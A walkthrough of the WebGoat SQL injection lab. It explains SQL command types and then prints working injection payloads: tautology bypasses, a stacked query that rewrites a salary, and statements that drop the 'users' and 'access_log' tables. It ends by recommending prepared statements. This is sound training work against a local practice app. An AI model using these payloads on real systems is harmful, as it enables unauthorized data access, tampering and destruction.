# WebGoat Lab — SQL Injection

## Launch WebGoat

```bash
sudo docker run -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 -e TZ=Europe/Amsterdam webgoat/webgoat
```

## Background

<img width="1414" height="842" alt="image" src="https://github.com/user-attachments/assets/3f9b5fbe-27be-4885-9543-b97a70b47f49" />

The lab lays out the scenario: a company stores employee data — a unique employee number (`userid`), last name, first name, department, salary, and a transaction authentication number (`auth_tan`) — with each field in its own column and each row representing one employee.

SQL queries can be used to modify a database table and its index structures, and to add, update, or delete rows of data. There are three main categories of SQL commands:

- **Data Manipulation Language (DML)**
- **Data Definition Language (DDL)**
- **Data Control Language (DCL)**

Each of these can be abused by an attacker to compromise the confidentiality, integrity, and/or availability of a system.

<img width="525" height="230" alt="image" src="https://github.com/user-attachments/assets/ef1c5e95-8fef-486b-96c5-18efe3db3eee" />

## Task 1 — Basic SELECT Query

The task was to retrieve the department of employee **Bob Franco** from the `Employees` table. The query:

```sql
SELECT department FROM Employees WHERE first_name = 'Bob' AND last_name = 'Franco';
```

Breaking it down:

- **`SELECT`** — choose what to retrieve from the table
- **`FROM`** — the table the data comes from (`Employees`)
- **`WHERE`** — the filter condition
- **`first_name = 'Bob'`** — match on the `first_name` column
- **`last_name = 'Franco'`** — match on the `last_name` column

<img width="785" height="292" alt="image" src="https://github.com/user-attachments/assets/0cfc88c0-3fc8-4cf7-ad60-6c4bc30146b7" />

Result: `Marketing`.

<img width="1356" height="713" alt="image" src="https://github.com/user-attachments/assets/5e857378-e5bf-4e7b-aa00-9d7d8c975838" />

## Task 2 — DML (Data Manipulation Language)

If an attacker manages to inject DML statements, they can compromise **confidentiality** (`SELECT`), **integrity** (`UPDATE`), and **availability** (`DELETE`/`UPDATE`) of a system.

DML commands are used for storing, retrieving, modifying, and deleting data:

- **`SELECT`** — retrieve data from a database
- **`INSERT`** — insert data into a database
- **`UPDATE`** — update existing data
- **`DELETE`** — delete records

Example:

```sql
SELECT phone
FROM employees
WHERE userid = 96134;
```

This retrieves the phone number of the employee with `userid` `96134`.

The task: change the department of **Tobi Barnett** to `'Sales'`. Note that full administrator privileges were granted for this assignment, with no authentication required.

<img width="1166" height="185" alt="image" src="https://github.com/user-attachments/assets/733fefbd-6df3-4b8e-871c-22ceb09f8060" />

Query used:

```sql
UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi' AND last_name = 'Barnett';
```

Breakdown:

- **`UPDATE`** — update existing data in `employees`
- **`SET`** — the column being changed (`department`)
- **`WHERE`** — same filtering logic as before

<img width="1144" height="314" alt="image" src="https://github.com/user-attachments/assets/d14ceacf-f7d5-455f-993e-755fafb61f73" />

## Task 3 — DDL (Data Definition Language)

<img width="1358" height="701" alt="image" src="https://github.com/user-attachments/assets/1e8ad8c4-e09a-4f19-8601-f18713025e17" />

If an attacker successfully injects DDL commands, they can compromise **integrity** (`ALTER`, `DROP`) and **availability** (`DROP`).

DDL commands are used for creating, modifying, and dropping the structure of database objects:

- **`CREATE`** — create database objects such as tables and views
- **`ALTER`** — alter the structure of an existing database object
- **`DROP`** — delete database objects

Example:

```sql
CREATE TABLE employees(
    userid varchar(6) not null primary key,
    first_name varchar(20),
    last_name varchar(20),
    department varchar(20),
    salary varchar(10),
    auth_tan varchar(6)
);
```

The task:

<img width="672" height="144" alt="image" src="https://github.com/user-attachments/assets/da2a6b0d-12e2-4442-8388-49ff3f0a7438" />

Add a `phone` column to the `employees` table:

```sql
ALTER TABLE employees ADD phone varchar(20);
```

- **`ALTER`** — alters the structure of the existing `employees` table
- **`ADD`** — adds the new `phone` column, `varchar(20)`

<img width="501" height="183" alt="image" src="https://github.com/user-attachments/assets/05e2fff9-a2b8-48f2-aae8-924278bb875e" />

## Task 4 — DCL (Data Control Language)

<img width="1390" height="607" alt="image" src="https://github.com/user-attachments/assets/0b1ae562-5af7-48a2-9518-a4d45e53a01d" />

If an attacker successfully injects DCL commands, they can compromise **confidentiality** (`GRANT`) and **availability** (`REVOKE`) — for example, granting themselves admin privileges or revoking the true administrator's access.

DCL commands implement access control on database objects:

- **`GRANT`** — give a user access privileges on database objects
- **`REVOKE`** — withdraw privileges previously granted

<img width="578" height="170" alt="image" src="https://github.com/user-attachments/assets/8dbde2ad-49a6-4c7d-bc81-062be6c8c616" />

The task: grant rights on the `grant_rights` table to `unauthorized_user`:

```sql
GRANT ALL ON grant_rights TO unauthorized_user;
```

- **`GRANT`** — give a user access privileges on database objects
- **`ON`** — the table the privileges apply to
- **`TO`** — the target user

<img width="512" height="173" alt="image" src="https://github.com/user-attachments/assets/f39f8843-5044-4647-840a-d415d850efe5" />

## What Is SQL Injection?

Tasks 6, 7, and 8 walk through the theory behind SQL injection in more depth — here's the short version.

**SQL Injection (SQLi)** is one of the most common web vulnerabilities. It happens when user input is inserted into an SQL query without proper validation or parameterization, letting an attacker manipulate the query.

Applications should always use **prepared statements** (parameterized queries) and validate user input to prevent SQL injection.

### Example

The application builds the following query:

```sql
SELECT * FROM users WHERE name = '" + userName + "';
```

If the user enters:

```text
Smith
```

the query becomes:

```sql
SELECT * FROM users WHERE name = 'Smith';
```

But if an attacker enters:

```text
Smith' OR '1'='1
```

the query becomes:

```sql
SELECT * FROM users WHERE name = 'Smith' OR '1'='1';
```

Since the condition is always true, the database returns every record.

### Common Payloads

```sql
Smith' OR '1'='1
```
Returns every row in the table.

```sql
Smith' OR 1=1; --
```
Bypasses the original condition and comments out the rest of the query.

```sql
Smith'; DROP TABLE users; --
```
Attempts to execute an additional command to drop the table (if multiple statements are allowed).

### Consequences of SQL Injection

A successful attack may allow an attacker to:

- Read or modify sensitive data
- Bypass authentication
- Delete or alter database tables
- Execute administrative database operations
- In some DBMSs, execute operating system commands

### Severity of SQL Injection

Impact depends on:

- The attacker's skill
- Database permissions (principle of least privilege)
- Input validation and parameterized queries
- Database engine features (some DBMSs don't allow multiple statements per query)

## Task 9 — String SQL Injection

<img width="1218" height="249" alt="image" src="https://github.com/user-attachments/assets/7622058b-3c00-4778-aedf-01e6c70ba07e" />

Task: retrieve all users from the table using a **string SQL injection**.

<img width="1365" height="658" alt="image" src="https://github.com/user-attachments/assets/48b850a0-d527-4d1f-ae65-faf73832f8f8" />

Resulting query:

```sql
SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'
```

Since `'1' = '1'` is always true, the database ignores the name filtering entirely and returns all available data.

## Task 10 — Numeric SQL Injection

<img width="1291" height="697" alt="image" src="https://github.com/user-attachments/assets/bfd59429-f534-490c-bb94-8479e459a4c8" />

Task: make `User_id` evaluate as a true statement. Payload used:

```sql
1 OR '1' = '1'
```

This always evaluates to `TRUE`, returning the complete list of users along with their credit card numbers.

## Task 11 — Retrieving All Employee Data

<img width="1353" height="704" alt="image" src="https://github.com/user-attachments/assets/82305cb7-39ca-40e0-80b2-a412a4e9e671" />

<img width="1105" height="350" alt="image" src="https://github.com/user-attachments/assets/34fb8a6a-5c38-43ee-90ae-e36685745083" />

Payload:

```sql
Smith' OR '1' = '1' --
```

All data retrieved. Breakdown: `OR TRUE` tells SQL to return everything, since the overall condition is always true.

## Task 12 — Updating Salary via SQL Injection

<img width="1381" height="593" alt="image" src="https://github.com/user-attachments/assets/21f398f7-d651-4ee0-8282-2b9dc173cfd7" />

Current salary was `$64,350` — not exactly satisfying, so time to fix that. Payload:

```sql
Smith'; UPDATE employees SET salary = '77777777' WHERE last_name = 'Smith' --
```

Breakdown: after `Smith`, the quote is closed and the original query is terminated with `;`. That opens the door to append a custom query:

- **`UPDATE`** — updates the table
- **`SET`** — sets the `salary` column to `77777777`
- **`WHERE`** — filters on the target last name
- **`--`** — comments out everything that follows

<img width="1118" height="460" alt="image" src="https://github.com/user-attachments/assets/f2ce100e-7987-426b-90c8-20bf0961f25f" />

Salary successfully updated to `7777777`. Done.

## Task 13 — Dropping a Table via SQL Injection

<img width="1407" height="562" alt="image" src="https://github.com/user-attachments/assets/f40071fa-171c-4c7a-8494-d89eba4263eb" />

Final task: drop the `access_log` table. Payload:

```sql
Smith'; DROP TABLE access_log --
```

This drops the `access_log` table and comments out everything after it.

<img width="1428" height="543" alt="image" src="https://github.com/user-attachments/assets/358797c0-5228-4894-9924-af4286b16739" />

## Result

SQL Injection challenge passed.

## Takeaway

Every one of these tasks comes down to the same root cause: user input concatenated directly into a SQL string instead of being passed as a bound parameter. Prepared statements neutralize all of the payloads above, since the input is treated strictly as data and never as executable SQL — regardless of quotes, comments, or stacked statements.
